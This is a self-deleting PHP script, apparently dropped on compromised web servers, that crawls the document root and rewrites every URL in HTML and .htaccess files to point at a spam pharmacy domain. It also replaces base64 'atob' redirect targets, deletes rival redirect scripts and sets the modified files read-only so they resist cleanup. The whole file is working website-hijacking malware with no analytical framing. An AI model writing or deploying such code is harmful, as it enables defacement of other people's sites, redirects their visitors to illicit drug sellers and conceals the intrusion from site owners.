<?php unlink(__FILE__); @ignore_user_abort (true);
//set_time_limit ( 666000 );
$atob = 0;

$x_domains = explode(',' ,  "pillperclick.shop");
//$x_domains = explode(',' ,  "healingbestvalue.su,medicalmedsinc.su,myfastdeal.su,theprivateinc.su");
//$x_domains = explode(',' ,  "myfavrxservice.shop,mytoprxservice.shop");
//$x_domains = explode(',' ,  "myfavrxservice.shop,mytoprxservice.shop,pillperclick.shop,pillscare.shop,pillsstore.shop,rxpillperclick.shop,yourrxdeliver.club");
$server_domain = $_SERVER['HTTP_HOST'];

// ------------------------ links in all folders



$root =  $_SERVER["DOCUMENT_ROOT"];
if (strpos($root,'/') !== false) {
    $path =  $root . "/";
}
else $path = $root . "\\";

$links_replaced = 0;
$files_changed = 0;
$php_redirect = 0;

$replace_link = 'https://' . $x_domains[array_rand($x_domains)] . '/';

$root = $path;
$root = rtrim(dirname($root, 2));
//$root = rtrim(dirname($root));

$realpath = $root;

echo  $root . '     ----  ' .   $realpath . PHP_EOL;

$fileObjects = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($realpath),
                 RecursiveIteratorIterator::SELF_FIRST);

foreach($fileObjects as $key => $object){
//    if($object->getFilename() === 'filename.png') {

//if ( (strpos($object->getFilename(), '.htaccess' ) !== false)   or (strpos($object->getFilename(),'.html') !== false) or (strpos($object->getFilename(), '.php') !== false)  ) {
if ( (strpos($object->getFilename(), '.htaccess' ) !== false)   or (strpos($object->getFilename(),'.html') !== false)  ) {
//if (strpos($object->getFilename(), '.htm' ) !== false)   {
        
$fname = $object->getPathname() ;
//echo  $fname . PHP_EOL;

$orig_body = File_get_contents($fname);




$string = $orig_body;


if (strpos($fname,'.php') !== false) {
//if (strpos($string,  "header('Location:" ) !== false) {

if (strpos($string,  '$root =  $_SERVER["DOCUMENT_ROOT"];' ) !== false) {


$php_redirect++;
//echo '!!!!! PHP REDIRECT - ' . $fname . PHP_EOL . PHP_EOL .$string . PHP_EOL . PHP_EOL;
//break;
chmod($fname, 0644);
unlink($fname);

}
}


if (strpos($fname,'.htaccess') !== false) {
if (strpos($string,'index.php') !== false) {}else{
//echo '!!!!! unknown HTACCESS - ' . $fname . PHP_EOL . PHP_EOL .$string . PHP_EOL . PHP_EOL;
}
}



$hook = checkAtobRedirect($string);
if (strlen($hook) > 0 ) 
{$string = str_replace( $hook, base64_encode($replace_link) , $string );
$atob++;
//echo PHP_EOL . $fname . PHP_EOL . 'Replaced : ' . $string . PHP_EOL;
//break;
}


preg_match_all('#(\w*://|www\.)[a-z0-9]+(-+[a-z0-9]+)*(\.[a-z0-9]+(-+[a-z0-9]+)*)+(/([^\s()<>;]+\w)?/?)?#i', $string, $matches, PREG_OFFSET_CAPTURE | PREG_SET_ORDER);
foreach (array_reverse($matches) as $match) {
$links_replaced++;
  $a = '<a href="'.(strpos($match[1][0], '/') ? '' : 'http://') . $match[0][0].'">' . $match[0][0] . '</a>';
  $string = substr_replace($string, $replace_link, $match[0][1], strlen($match[0][0]));
}

$changed_body = $string;



if (strlen($changed_body)>5) {
$files_changed++;
//echo  'INDEX.PHP PATCHED--1111111' . PHP_EOL;
chmod($fname, 0644);
//unlink($fname);


file_put_contents($fname, $changed_body);
//$fp = fopen($fname , 'w');
//fwrite($fp, $changed_body);
//fclose($fp);
chmod($fname, 0444);
}





    }
}

//echo 'Files = ' . $files_changed  . '  Links changed in  '  . $links_replaced . ' files'; 
echo 'Domain = ' .  $server_domain .  '  Files = ' . $files_changed  . '  Links changed in  '  . $links_replaced . ' files ... atob changed : ' . $atob . '   PHP execute files old : ' . $php_redirect; 




function checkAtobRedirect($body)
{

$variant = 'location.href=atob("';

if (strpos($body, $variant) !== false) {

$position = strpos($body, $variant);
//echo PHP_EOL . $position . PHP_EOL;

if ($position > 0){
$hook =substr($body, $position , 10000);
$hook =substr($hook,  strpos($hook, '"')+1, 10000);
$hook =substr($hook,  0, strpos($hook, '"'));
//echo $hook . PHP_EOL;
}
//if (strpos($dir,'/') !== false) {}else{break;}
//$dir = substr($dir, $position + 1, 1000);

return $hook;
}
}


